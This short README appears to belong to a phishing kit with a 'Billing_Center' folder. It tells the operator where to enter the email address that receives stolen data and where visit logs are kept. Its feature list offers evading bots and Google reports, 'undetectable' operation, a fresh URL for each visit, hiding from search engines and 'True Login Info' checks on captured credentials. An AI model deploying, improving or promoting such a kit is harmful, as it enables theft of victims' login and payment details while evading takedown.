- Put your email in "Email.php" file.

- Don't change the name of this folder "Billing_Center".

- You can find the logs for each vist in the log folder.



Features:

- Deny Spam, spiders bots, Google bots (Reports).
- Undetectable.
- New Url & folder every new vist.
- Self-Hosted Files, Images.etc.
- True Login Info.
- Meta to block search engines.
- robots.txt to block search engines.
- Logs.